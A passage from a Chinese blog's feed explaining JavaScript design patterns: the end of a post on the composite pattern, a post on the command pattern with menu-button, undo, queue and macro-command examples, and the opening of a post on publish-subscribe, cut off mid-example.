title="十、何时使用组合模式"></a>十、何时使用组合模式</h3><p>组合模式如果运用得当，可以大大简化客户的代码。一般来说，组合模式适用于以下这两种情况：</p><ul><li><p>表示对象的部分-整体层次结构。组合模式可以方便地构造一棵树来表示对象的部分-整体结构。特别是我们在开发期间不确定这棵树到底存在多少层次的时候。在树的构造最终完成之后，只需要通过请求树的最顶层对象，便能对整棵树做统一的操作。在组合模式中增加和删除树的节点非常方便，并且符合开放-封闭原则。</p></li><li><p>客户希望统一对待树中的所有对象。组合模式使客户可以忽略组合对象和叶对象的区别，客户在面对这棵树的时候，不用关心当前正在处理的对象还是叶对象，也就不用写一堆if、else语句来分别处理它们。组合对象和叶对象会各自做自己正确的事情，这是组合模式最重要的能力。</p></li></ul><h3 id="十一、小结"><a href="#十一、小结" class="headerlink" title="十一、小结"></a>十一、小结</h3><p>组合模式可以让我们使用树形方式创建对象的结构。可以把相同的操作应用在组合对象和单个对象上。在大多数情况下，我们都可以忽略掉组合对象和单个对象之间的差别，从而用一致的方式来处理它们。</p><p>然而，组合模式并不是完美的，他可能会产生一个这样的系统：系统中的每个对象看起来都与其他对象差不多。它们的区别只有在运行的时候才会显现出来，这会使代码难以理解。此外，如果通过组合模式创建了太多的对象，那么这些对象可能会让系统负担不起。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;组合模式就是用小的子对象来构建更大的对象，而这些小的子对象本身也许是由更小的”孙对象”构成的。&lt;/p&gt;
&lt;h3 id=&quot;一、回顾宏命令&quot;&gt;&lt;a href=&quot;#一、回顾宏命令&quot; class=&quot;headerlink&quot; title=&quot;一、回顾宏命令&quot;&gt;&lt;/a&gt;一、回顾宏命令&lt;/h</summary>
      
    
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/categories/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/tags/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>命令模式</title>
    <link href="http://cychenhaibin.github.io/2024/09/11/%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F/"/>
    <id>http://cychenhaibin.github.io/2024/09/11/%E5%91%BD%E4%BB%A4%E6%A8%A1%E5%BC%8F/</id>
    <published>2024-09-11T12:36:47.000Z</published>
    <updated>2024-09-11T12:36:30.000Z</updated>
    
    <content type="html"><![CDATA[<p>假设有一个快餐店，而我是快餐店的点餐服务员，那么我一天的工作应该是这样的：当某位客人点餐或者打来订餐电话后，我会把他的需求都写在清单上，然后交给厨房，客人不用关心的是哪些厨师帮他炒菜。我们餐厅还可以满足客人需要的定时服务，比如客人正在回家的路上，要求1个小时后才开始炒他的菜，只要订单还在，厨师就不会忘记。客人也可以很方便地打电话来撤销订单。另外如果有太多地客人点餐，厨房可以按照订单的顺序排队炒菜。</p><p>这些记录着订餐信息的清单，便是命令模式中的命令对象。</p><h3 id="一、命令模式的用途"><a href="#一、命令模式的用途" class="headerlink" title="一、命令模式的用途"></a>一、命令模式的用途</h3><p>命令模式是最简单和优雅的模式之一，命令模式中的命令（command）指的是一个执行某些特定事情的指令。</p><p>命令模式最常见的应用场景是：有时候需要向某些对象发送请求，但是并不知道请求的接收者是谁，也不知道被请求的操作是什么。此时希望用一种松耦合的方式来设计程序，使得请求发送者和请求接收者能够消除彼此之间的耦合关系。</p><p>拿订餐来说，客人需要向厨师发送请求，但是完全不知道这些厨师的名字和联系方式，也不知道厨师炒菜的方式和步骤。命令模式把客人订餐的请求封装成command对象，也就是订餐中的订餐对象。这个对象可以在程序中被四处传递，就像订餐可以从服务员中手中传到厨师手中。这样一来，客人不需要知道厨师的名字，从而解开了请求调用者和请求接收者之间的耦合关系。</p><p>另外，相对于过程化的请求调用，command对象拥有更长的生命周期。对象的生命周期是跟初始化请求无关的，因为这个请求已经被封装在了command对象的方法中，成为了这个对象的行为，我们可以在程序运行的任意时刻去调用这个方法，就像厨师可以在客人预定1个小时之后才能帮他炒菜，相当于程序在1个小时之后才开始执行command对象的方法。</p><h3 id="二、命令模式的例子-菜单程序"><a href="#二、命令模式的例子-菜单程序" class="headerlink" title="二、命令模式的例子-菜单程序"></a>二、命令模式的例子-菜单程序</h3><p>假设我们正在编写一个用户界面程序，该用户界面上至少有数十个Button按钮。因为项目比较复杂，所以我们决定让某个程序员负责绘制这些按钮，而另外一些程序员则负责编写点击按钮后的具体行为，这些行为都将被封装在对象里。</p><p>命令模式的场景：</p><blockquote><p>有时候需要向某些对象发送请求，但是并不知道请求的接收者是谁、也不知道被请求的操作是什么，此时希望用一种松耦合的方式来设计软件，使得请求发送者和请求接收者能够消除彼此之间的耦合关系。</p></blockquote><p>我们很快可以找到在这里运用命令模式的理由：点击了按钮之后，必须向某些负责具体的行为的对象发送请求，这些对象就是请求的接收者。但是目前并不知道接收者是什么对象，也不知道接收者究竟会做什么。此时我们需要借助命令对象的帮助，以便解开按钮和负责具体行为对象之间的耦合。</p><p>设计模式的主题总是把不变的事物和变化的事物分离开来，命令模式也不例外，按下按钮之后会发生一些事情是不变的，而具体会发生什么事情是可变的。通过command对象的帮助，将来我们可以轻易地改变这种关联，因此也可以在将来再次改变按钮的行为。</p><p>首先在页面中完成这些按钮的“绘制”：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;button&quot;</span>&gt;</span>点击按钮1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;button&quot;</span>&gt;</span>点击按钮2<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;button&quot;</span>&gt;</span>点击按钮3<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> button1 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;button1&#x27;</span>),</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> button2 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;button2&#x27;</span>),</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> button3 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;button3&#x27;</span>),</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>下面定义setCommand函数，setCommand函数负责往按钮上安装命令。可以肯定的是，点击按钮会执行某个command命令，执行命令的动作被约定为调用command对象的execute()方法。虽然还不知道这些命令究竟代表了什么操作，但负责绘制按钮的程序员不关心这些事情，他只需要预留好安装命令的接口，command对象自然知道如何正确的对象沟通：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> setCommand = <span class="keyword">function</span>(<span class="params">button, command</span>)&#123;</span><br><span class="line">    button.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        command.<span class="title function_">execute</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>最后，负责编写点击按钮之后的具体行为的程序员交上了他们的成果，他们完成了刷新菜单界面、增加子菜单和删除子菜单这几个功能，这几个功能被分布在MenuBar和SubMenu这两个对象中：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">MenuBar</span> = &#123;</span><br><span class="line">    <span class="attr">refresh</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;刷新菜单目录&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">SubMenu</span> = &#123;</span><br><span class="line">    <span class="attr">add</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;增加子菜单&#x27;</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">del</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;删除子菜单&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>让button变得有勇气来之前，要先把这些行为都封装在命令类中：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">RefreshMenuBarCommand</span> = <span class="keyword">function</span>(<span class="params">receiver</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">receiver</span> = receiver</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">RefreshMenuBarCommand</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">execute</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">receiver</span>.<span class="title function_">refresh</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">AddSubMenuCommand</span> = <span class="keyword">function</span>(<span class="params">receiver</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">receiver</span> = receiver;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">AddSubMenuCommand</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">execute</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">receiver</span>.<span class="title function_">add</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">DelSubMenuCommand</span> = <span class="keyword">function</span>(<span class="params">receiver</span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">receiver</span> = receiver;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title class_">DelSubMenuCommand</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">execute</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;删除子菜单&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后就是把命令接收者传入到command对象中，并且把command对象安装到button上面：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> refreshMenuBarCommand = <span class="keyword">new</span> <span class="title function_">refreshMenuBarCommand</span>(<span class="title class_">MenuBar</span>);</span><br><span class="line"><span class="keyword">var</span> addSubMenuCommand = <span class="keyword">new</span> <span class="title function_">addSubMenuCommand</span>(<span class="title class_">SubMenu</span>);</span><br><span class="line"><span class="keyword">var</span> delSubMenuCommand = <span class="keyword">new</span> <span class="title function_">delSubMenuCommand</span>(<span class="title class_">SubMenu</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">setCommand</span>(button1, refreshMenuBarCommand);</span><br><span class="line"><span class="title function_">setCommand</span>(button2, addSubMenuCommand);</span><br><span class="line"><span class="title function_">setCommand</span>(button3, delSubMenuCommand);</span><br></pre></td></tr></table></figure><h3 id="三、JavaScript中的命令模式"><a href="#三、JavaScript中的命令模式" class="headerlink" title="三、JavaScript中的命令模式"></a>三、JavaScript中的命令模式</h3><p>命令模式的由来，其实是回调函数的一个面向对象的替代品。</p><p>JavaScript作为将函数作为一等对象的语言，跟策略模式一样，命令模式也早已融入到JavaScript语言之中。运算块不一定要封装在<code>command.execute</code>方法中，也可以封装在普通函数中。函数作为一等对象，本身就可以被四处传播。即使我们依然需要请求“接收者”，那也未必使用面向对象的方式，闭包可以完成同样的功能。</p><p>在面向对象设计中，命令模式的接收者被当成command对象的属性保存起来，同时约定执行命令的操作调用<code>command.execute</code>方法。在使用闭包的命令模式实现中，接收者被封闭在闭包产生的环境中，执行命令的操作可以更加简单，仅仅执行回调函数即可。无论接收者被保存为对象的属性，还是被封闭在闭包产生的环境中，在将来执行命令的时候，接收者都能被顺利访问。</p><h3 id="四、撤销命令"><a href="#四、撤销命令" class="headerlink" title="四、撤销命令"></a>四、撤销命令</h3><p>命令模式的作用不仅是封装运算块，而且可以很方便地给命令对象增加撤销操作。就像订餐时客人可以通过电话来取消订单一样。</p><p>撤销操作的实现一般是给命令对象增加一个名为unexecude或者undo的方法，在该方法里执行execute的反向操作。</p><p>撤销是命令模式里一个非常有用的功能，试想一下开发一个围棋程序的时候，我们把每一棋子的变化都封装成命令，则可以轻而易举的实现悔棋功能。同样，撤销命令还可以用于编辑器的Ctrl+Z功能。</p><h3 id="五、撤销和重做"><a href="#五、撤销和重做" class="headerlink" title="五、撤销和重做"></a>五、撤销和重做</h3><p>很多时候，我们需要撤销一系列的命令。比如在一个围棋程序中，现在已经下了10步棋，我们需要一次性悔棋到第5步。在这之前，我们可以把所有执行过的下棋命令都存储在一个历史列表中，然后倒序循环来依次执行这些命令的undo操作，直到循环执行到第5个命令为止。</p><p>然而，在某些情况下无法顺利地利用undo操作让对象回到execute之前的状态。比如在一个Canvas画图的程序中，画布上有一些点，我们在这些点之间画了N条曲线把这些点相互连接起来，当然这是用命令模式来实现的。但是我们却很难为这里的命令对象定义一个擦除某条曲线的undo操作，因为在Canvas画图中，擦除一条线相对不容易实现。</p><p>这时候最好的办法是先清除画布，然后把刚才执行过的命令全部重新执行一遍。这一点同样可以利用一个历史列表堆栈办到。记录命令日志，然后重新执行它们，这是逆转不可逆命令的一个好办法。</p><h3 id="六、命令队列"><a href="#六、命令队列" class="headerlink" title="六、命令队列"></a>六、命令队列</h3><p>在订餐的故事中，如果订单的数量过多而厨师的人手不够，则可以让这些订单进行排队处理。第一个订单完成之后，再开始执行跟第二个订单有关的操作。<br>队列在动画中的运用场景也非常多，比如小球运动程序有可能遇到另外一个问题：有些用户反馈，这个程序只适合于APM小于20的人群，大部分用户都有快速连续点击按钮的习惯，当用户第二次点击button的时候，此时小球的前一个动画可能尚未结束，于是前一个动画会骤然停止，小球转而开始第二个动画的运动过程。但这并不是用户的期望，用户希望这两个动画会排队进行。<br>把请求封装成命令对象的优点在这里再次体现了出来，对象的生命周期几乎是永久的，除非我们主动去回收它。也就是说，命令对象的生命周期跟初始请求发生的时间无关，comand对象的execute 方法可以在程序运行的任何时刻执行，即使点击按钮的请求早已发生，但我们的命令对象仍然是有生命的。<br>所以我们可以把div 的这些运动过程都封装成命令对象，再把它们压进一个队列堆栈，当动画执行完，也就是当前command对象的职责完成之后，会主动通知队列，此时取出正在队列中等待的第一个命令对象，并且执行它。<br>我们比较关注的问题是，一个动画结束后该如何通知队列。通常可以使用回调函数来通知队列，除了回调函数之外，还可以选择发布-订阅模式。即在一个动画结束后发布一个消息，订阅者接收到这个消息之后，便开始执行队列里的下一个动画。</p><h3 id="七、宏命令"><a href="#七、宏命令" class="headerlink" title="七、宏命令"></a>七、宏命令</h3><p>宏命令是一组命令的集合，通过执行宏命令的方式，可以一次执行一批命令。想象一下，家里有一个万能遥控器，每天回家的时候，只要按一个特别的按钮，他就会帮我们关上房间门，顺便打开电脑并登录QQ。</p><p>下面我们逐步创建一个宏命令。首先，我们依然要创建好各种Command：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> closeDoorCommand = &#123;</span><br><span class="line"><span class="attr">execute</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;关门&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> openPcCommand = &#123;</span><br><span class="line"><span class="attr">execute</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;开电脑&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> openQQCommand = &#123;</span><br><span class="line"><span class="attr">execute</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;登录QQ&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接下来定义宏命令MacroCommand，它的结构也很简单。macroCommand.add方法表示把子命令添加进宏命令对象，当调用宏命令对象的execute方法时，会迭代这一组子命令对象，并且依次执行它们的execute方法：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">MacroCommand</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">commandsList</span>: [],</span><br><span class="line">        <span class="attr">add</span>: <span class="keyword">function</span>(<span class="params">command</span>)&#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">commandsList</span>.<span class="title function_">push</span>(command);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">execute</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, command; command = <span class="variable language_">this</span>.<span class="property">commandsList</span>[i++];)&#123;</span><br><span class="line">                command.<span class="title function_">execute</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> macroCommand = <span class="title class_">MacroCommand</span>();</span><br><span class="line">macroCommand.<span class="title function_">add</span>(closeDoorCommand);</span><br><span class="line">macroCommand.<span class="title function_">add</span>(openPcCommand);</span><br><span class="line">macroCommand.<span class="title function_">add</span>(openQQCommand);</span><br><span class="line"></span><br><span class="line">macroCommand.<span class="title function_">execute</span>();</span><br></pre></td></tr></table></figure><p>当然我们还可以为宏命令添加撤销功能，跟<code>macroCommand.execute</code>类似，当调用<code>macroCommand.undo</code>方法时，宏命令里包含的所有子命令对象要依次执行各自的undo操作。</p><p>宏命令是命令模式与组合模式的联用产物。</p><h3 id="八、智能命令与傻瓜命令"><a href="#八、智能命令与傻瓜命令" class="headerlink" title="八、智能命令与傻瓜命令"></a>八、智能命令与傻瓜命令</h3><p>再看一下我们上一节创建的命令：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> closeDoorCommand = &#123;</span><br><span class="line"><span class="attr">execute</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;关门&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>很奇怪，closeDoorCommand中没有包含任何receiver的信息，它本身九包揽了执行请求的行为，这跟我们之前看到的命令对象都包含了一个receiver是矛盾的。</p><p>一般来说，命令模式都会在command对象中保存一个接收者来负责真正执行客户的请求，这种情况下ml对象是”傻瓜式“的，它只负责把客户的请求转交给接收者来执行，这种模式的好处是请求发起者和请求接收者之间尽可能地得到了解耦。</p><p>但是我们也可以定义一些更”聪明“的命令对象。”聪明“的命令对象可以直接实现请求，这样一来就不再需要接收者的存在，这种”聪明“的命令对象也叫做智能命令。没有接收者的智能命令，退化到和策略模式非常相近，从代码结构上已经无法分辨它们，能分辨的只有它们的意图的不同。策略模式指向的问题域更小，所有策略对象的目标总是一致的，它们只是达到这个目标的不同手段，它们的内部实现是针对”算法“而言的。而智能命令模式指向的问题域更广，command对象解决的目标更具发散性。命令模式还可以完成撤销、排队等功能。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;假设有一个快餐店，而我是快餐店的点餐服务员，那么我一天的工作应该是这样的：当某位客人点餐或者打来订餐电话后，我会把他的需求都写在清单上，然后交给厨房，客人不用关心的是哪些厨师帮他炒菜。我们餐厅还可以满足客人需要的定时服务，比如客人正在回家的路上，要求1个小时后才开始炒他的菜</summary>
      
    
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/categories/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="JavaScript的设计模式和开发实践" scheme="http://cychenhaibin.github.io/tags/JavaScript%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"/>
    
  </entry>
  
  <entry>
    <title>发布-订阅模式</title>
    <link href="http://cychenhaibin.github.io/2024/09/11/%E5%8F%91%E5%B8%83-%E8%AE%A2%E9%98%85%E6%A8%A1%E5%BC%8F/"/>
    <id>http://cychenhaibin.github.io/2024/09/11/%E5%8F%91%E5%B8%83-%E8%AE%A2%E9%98%85%E6%A8%A1%E5%BC%8F/</id>
    <published>2024-09-11T08:59:47.000Z</published>
    <updated>2024-09-11T08:59:24.000Z</updated>
    
    <content type="html"><![CDATA[<p>发布-订阅模式又叫观察者模式，它定义对象间的一种一对多的依赖关系，当一个对象的状态发生改变时，所有依赖于它的对象都将得到通知。在JavaScript开发中，我们一般用事件模型来替代传统的发布-订阅模式。</p><h3 id="一、现实中的发布-订阅模式"><a href="#一、现实中的发布-订阅模式" class="headerlink" title="一、现实中的发布-订阅模式"></a>一、现实中的发布-订阅模式</h3><p>小明最近看上了一套房子，到了售楼处之后才被告知，该楼盘的房子早已售罄。好在售楼MM告诉小明，不久之后还有一些尾盘推出，开发商正在办理相关手续，手续办好后便可以购买。但到底是什么时候，目前还没有人能够知道。</p><p>于是小明记下了售楼处的电话，以后每天都会打电话过去询问是不是已经到了购买时间。除了小明，还有小红、小强、小龙也会每天向售楼处咨询这个问题。一个星期过后，售楼MM决定辞职，因为厌倦了每天回答1000个相同内容的电话。</p><p>当然现实中没有那么笨的销售公司，实际上故事是这样的：小明离开之前，把电话号码留在了售楼处。售楼MM答应他，新楼盘一推出就马上发信息给小明。小红、小强、小龙也是一样，他们的电话号码都被记在售楼处的花名册上，新楼盘退出的时候，售楼MM会翻开花名册，遍历上面的电话号码，依次发送一条短信来通知他们。</p><h3 id="二、发布-订阅模式的作用"><a href="#二、发布-订阅模式的作用" class="headerlink" title="二、发布-订阅模式的作用"></a>二、发布-订阅模式的作用</h3><p>在这个例子中使用发布-订阅模式有着显而易见的优点：</p><ul><li>购房者不用天天给售楼处打电话咨询开售时间，在合适的时间点，售楼处作为发布者会通知这些消息订阅者。</li><li>购房者和售楼处之间不再强耦合在一起，当有新的购房者出现时，他只需把手机号码留在售楼处，售楼处不关心购买者的任何情况，不管购房者是男是女还是一只猴子。而售楼处的任何变动也不会影响购买者，比如售楼MM离职，售楼处从一楼搬到二楼，这些改变都跟购房者无关，只要售楼处记得发短信这件事情。</li></ul><p>第一点说明发布-订阅模式可以广泛应用于异步编程中，这是一种替代传递回调函数的方案。比如，我们可以订阅ajax请求的error、succ等事件。或者如果想在动画的每一帧完成之后做一些事情，那我们可以订阅一个事件，然后在动画的每一帧完成之后发布这个事件。在异步编程中使用发布-订阅模式，我们就无需过多关注对象在异步运行期间的内部状态，而只需订阅感兴趣的事件发生点。</p><p>第二点说明发布-订阅模式可以取代对象之间硬编码的通知机制，一个对象不用再显式地调用另外一个对象的某个接口。发布-订阅模式让两个对象松耦合地联系在一起，虽然不太清楚彼此的细节，但这不影响它们之间相互通信。当有新的订阅者出现时，发布者的代码不需要任何修改；同样发布者需要改变时，也不会影响到之前的订阅者。只要之前约定的事件名没有变化，就可以自由地改变它们。</p><h3 id="三、DOM事件"><a href="#三、DOM事件" class="headerlink" title="三、DOM事件"></a>三、DOM事件</h3><p>实际上，只要我们曾经在DOM节点上面绑定过对事件函数，那我们就曾经使用过发布-订阅模式，来看看下面这两句简单地代码发生了什么事情：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="number">2</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">click</span>();   <span class="comment">// 模拟用户点击</span></span><br></pre></td></tr></table></figure><p>在这里需要监控用户点击document.body的动作，但是我们没办法预知用户将在什么时候点击。所以我们订阅document.body上的click事件，当body节点被点击时，body节点便会向订阅者发布这个消息。这很像购房的例子，购房者不知道房子什么时候开售，于是他在订阅消息等待售楼处发布消息。</p><p>当然我们还可以随意增加或者删除订阅者，增加任何订阅者都不会影响发布者代码的编写：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="number">2</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="number">3</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="number">4</span>);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">click</span>();   <span class="comment">// 模拟用户点击</span></span><br></pre></td></tr></table></figure><p>注意，手动触发事件更好的做法是IE下用fireEvent，标准浏览器下用dispatchEvent实现。</p><h3 id="四、自定义事件"><a href="#四、自定义事件" class="headerlink" title="四、自定义事件"></a>四、自定义事件</h3><p>除了DOM事件，我们还会经常实现一些自定义的事件，这种依靠自定义事件完成的发布-订阅模式可以用于任何JavaScript代码中。</p><p>看看如何一步步实现发布-订阅模式。</p><ul><li>首先要指定好谁充当发布者（比如售楼处）</li><li>然后给发布者添加一个缓存列表，用于存放回调函数以便通知订阅者（售楼处的花名册）。</li><li>最后发布消息的时候，发布者会遍历这个缓存列表，依次触发里面存放的订阅者回调函数（遍历花名册，挨个发短信）</li></ul><p>另外，我们还可以往回调函数里面填入一些参数，订阅者可以接受这些参数，比如售楼处可以在发给订阅者的短信里面加上房子的单价、面积、容积率等信息，订阅者接收到这些信息之后可以进行各自的处理：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> salesOffices = &#123;&#125;;                               <span class="comment">// 定义售楼处</span></span><br><span class="line"></span><br><span class="line">salesOffices.<span class="property">clientList</span> = [];                        <span class="comment">// 缓存列表，存放订阅者的回调函数</span></span><br><span class="line"></span><br><span class="line">salesOffices.<span class="property">listen</span> = <span class="keyword">function</span>(<span class="params">fn</span>)&#123;                  <span class="comment">// 增加订阅者</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">clientList</span>.<span class="title function_">push</span>(fn);                        <span class="comment">// 订阅的消息添加进缓存列表</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">salesOffices.<span class="property">trigger</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;                   <span class="comment">// 发布消息</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>,fn; fn = <span class="variable language_">this</span>.<span class="property">clientList</span>[i++];)&#123;</span><br><span class="line">        fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);                   <span class="comment">// arguments是发布消息时带上的参数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>下面我们来进行一些测试</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">salesOffices.<span class="title function_">listen</span>(<span class="keyword">function</span>(<span class="params">price, squareMeter</span>)&#123;     <span class="comment">// 小明订阅消息</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;价格=&#x27;</span>+price);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;squareMeter=&#x27;</span>+squareMeter);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">salesOffices.<span class="title function_">listen</span>(<span 